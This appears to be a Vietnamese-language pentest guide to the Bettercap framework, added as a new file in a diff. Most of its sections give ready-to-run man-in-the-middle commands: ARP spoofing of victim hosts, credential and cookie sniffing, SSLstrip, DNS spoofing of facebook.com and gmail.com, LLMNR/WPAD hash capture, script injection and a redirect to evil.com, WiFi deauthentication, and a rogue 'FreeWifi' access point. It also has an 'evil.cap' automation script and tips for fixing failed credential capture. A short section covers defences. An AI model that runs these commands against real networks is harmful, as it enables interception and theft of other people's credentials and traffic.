@@ -1,0 +1,215 @@
+1. Bettercap là gì?
+
+    Bettercap là framework MITM/network attack tự động hóa mạnh nhất hiện nay (thay thế ettercap/sslstrip/mitmproxy cũ) cho phép:
+
+        MITM mọi giao thức mạng (LAN, WiFi, BLE, Bluetooth, IoT, IPv4/6, TCP/UDP)
+
+        Sniff password, session, cookie, credential trên HTTP, HTTPS, FTP, SMTP, POP3, Telnet, IMAP, v.v.
+
+        Fake DNS, ARP, DHCP, ICMP, NetBIOS, LLMNR, WPAD, làm mù firewall/IDS
+
+        SSLSTRIP (downgrade HTTPS → HTTP), fake certificate
+
+        Inject JS, redirect, serve malware, fake update, phishing, social engineering
+
+        Tấn công WiFi AP, client deauth, captive portal, sniff handshakes, crack WPA2
+
+        Automation bằng script .cap hoặc module Go/Python
+
+        Hỗ trợ Web UI và API REST, export log JSON/PCAP, forensic, reporting mạnh.
+
+2. Cài đặt Bettercap
+A. Kali/Ubuntu/Debian
+
+sudo apt update
+sudo apt install bettercap
+
+B. Cài bản mới nhất (cross-platform, khuyến nghị)
+
+wget https://github.com/bettercap/bettercap/releases/latest/download/bettercap_linux_amd64.zip
+unzip bettercap_linux_amd64.zip
+sudo mv bettercap /usr/local/bin/
+bettercap --version
+
+C. Web UI (dashboard cực mạnh, port 8083 mặc định)
+
+sudo bettercap -caplet http-ui
+# Mở browser: http://127.0.0.1:8083
+# Default password: bettercap
+
+3. Workflow MITM thực chiến với Bettercap
+A. Xác định interface, subnet, victim/gateway
+
+ip a
+ip route
+netdiscover -i eth0
+
+    Ghi lại IP attacker, gateway, victim.
+
+B. Khởi động MITM toàn mạng
+
+sudo bettercap -iface eth0
+
+    Nếu WiFi: -iface wlan0 --no-colors (nên dùng card WiFi USB support monitor mode)
+
+C. ARP spoof (auto) + sniff traffic
+
+    Bật ARP spoof:
+
+    net.probe on
+    set arp.spoof.targets 192.168.1.50,192.168.1.51
+    arp.spoof on
+    net.sniff on
+
+    Log sẽ hiển thị mọi credential, session, cookie sniff được.
+
+D. SSLSTRIP, fake certificate, bẻ khóa HTTPS
+
+    Bật SSLSTRIP:
+
+set proxy.sslstrip on
+set proxy.sslstrip.log /tmp/sslstrip.log
+set proxy.sslstrip.code 301,302
+
+Bật HTTPS proxy:
+
+set https.proxy on
+set https.proxy.port 443
+set https.proxy.sslkey /path/to/key.pem
+set https.proxy.sslcert /path/to/cert.pem
+
+Chạy iptables để redirect traffic:
+
+    sudo bettercap -eval "net.recon on; net.probe on; arp.spoof on; net.sniff on; set net.sniff.output /tmp/sniff.pcap"
+    sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
+
+4. Fake DNS/DHCP/LLMNR/NBT-NS/WPAD để bắt hash/credential
+
+    Bật fake DNS:
+
+set dns.spoof.all true
+set dns.spoof.domains facebook.com,youtube.com,*.company.com
+set dns.spoof.address 192.168.1.100
+dns.spoof on
+
+Bật WPAD, LLMNR:
+
+    net.probe on
+    wpad.spoof on
+    llmnr.spoof on
+    nbns.spoof on
+
+    Kết hợp với Responder/Impacket ntlmrelayx để bắt và relay hash.
+
+5. Inject JS, redirect, serve malware, phishing
+
+    Inject JS vào mọi response HTML:
+
+set http.server.address 192.168.1.100
+set http.server.body "<script>alert('Hacked!')</script>"
+http.server on
+
+Redirect HTTP/HTTPS:
+
+    set http.server.redirect https://evil.com
+    http.server on
+
+    Fake update, captive portal, social engineering trên WiFi/IoT.
+
+6. Sniff credential, session, cookie, extract file
+
+    Bettercap auto parse password, form data, session, cookie, token, ghi log ra màn hình/PCAP/log file.
+
+    Xem log:
+
+    tail -f /tmp/sniff.pcap
+    tail -f /tmp/sslstrip.log
+
+    Xuất log JSON/CSV để report hoặc tự động hóa parse.
+
+7. Tấn công WiFi nâng cao
+
+    Sniff handshake WPA2, crack offline:
+
+wifi.recon on
+wifi.assoc <target_AP_BSSID>
+wifi.deauth <target_AP_BSSID>
+wifi.handshakes on
+
+Fake AP, captive portal, social engineering:
+
+    wifi.ap on
+    set wifi.ap.ssid "FreeWifi"
+    set wifi.ap.gateway 192.168.99.1
+    set wifi.ap.dhcp on
+    set wifi.ap.dhcp.range 192.168.99.100-192.168.99.200
+
+    Phát tán malware, redirect traffic client WiFi.
+
+8. Scripting, automation, REST API
+
+    Script .caplet: Tập hợp nhiều command cho automation:
+
+# evil.cap
+set arp.spoof.targets 192.168.1.50
+arp.spoof on
+net.sniff on
+set proxy.sslstrip on
+set dns.spoof.domains *.facebook.com,*.gmail.com
+dns.spoof on
+
+    sudo bettercap -iface eth0 -caplet evil.cap
+
+    REST API/Web UI:
+
+        Bật: -caplet http-ui
+
+        Dùng Python/Go/script khác để tự động hóa attack, reporting, cảnh báo SIEM, v.v.
+
+9. Forensic, blue team: phát hiện và phòng chống
+
+    Dùng Bettercap ở chế độ monitor để log traffic, phát hiện ARP/DNS spoof, bất thường mạng, hunt anomaly.
+
+    Phòng chống:
+
+        Tắt LLMNR/NBT-NS/WPAD trên client Windows
+
+        Bật HSTS, enforce HTTPS, dùng VPN/Zero Trust
+
+        Bật Dynamic ARP Inspection, port isolation trên switch
+
+        Monitor log, cảnh báo khi có giả mạo MAC/IP/DNS/ARP bất thường.
+
+10. Fix lỗi thường gặp
+Lỗi	Fix
+Không MITM được traffic	Đúng interface, IP forwarding, run sudo/root, firewall/selinux không block
+Không sniff được HTTPS	Cấu hình SSLSTRIP đúng, browser có HSTS, thử attack HTTP hoặc app mobile
+Log không ra credential	Trang chỉ dùng HTTPS/HSTS, app encrypt payload, dùng thêm Responder hoặc phishing
+Không fake DNS thành công	Check domain wildcard, DNS resolver, nạn nhân dùng DoH/DoT
+Không bắt được handshake WiFi	Card WiFi chưa hỗ trợ monitor mode, thử với card khác, AP hỗ trợ 2.4GHz
+Web UI không mở	Port 8083 bị block, chưa bật -caplet http-ui, firewall
+11. So sánh Bettercap với các tool khác
+Tool	Ưu điểm Bettercap	Khác biệt
+Bettercap	MITM all-in-one mạnh nhất, script, API, GUI, WiFi, BLE, IoT, phishing, forensic, sniff mọi giao thức	CLI chuyên sâu, nhiều module, phải học command
+Ettercap	GUI/TUI, filter packet, MITM nhiều giao thức	Lỗi thời, ít update, không automation mạnh
+mitmproxy	MITM HTTP(S) mạnh, script Python, sửa traffic	Không spoof ARP/DNS, không sniff WiFi/BLE
+Responder	Bắt hash, broadcast LAN mạnh	Không MITM HTTP(S), không ARP/DNS/WiFi attack
+arpspoof/sslstrip	Đơn giản, script tốt, tấn công classic	Không all-in-one, thiếu automation, không WiFi
+12. Tài liệu, link hữu ích
+
+    Bettercap Official
+
+    Bettercap Wiki
+
+    Bettercap Caplets Gallery
+
+    Hacktricks Bettercap
+
+    PayloadAllTheThings – MITM
+
+Tóm tắt nhanh
+
+    Bettercap: framework MITM mạng mạnh nhất cho pentest/red team — attack/monitor/sniff password, fake DNS/ARP/DHCP/Netbios, WiFi attack, phishing, inject code, automation, REST API, reporting forensic, cả CLI lẫn Web UI, script .caplet.
+
+    Kết hợp cùng Responder, mitmproxy, impacket, automation script, blue team monitor, SIEM cảnh báo.
+
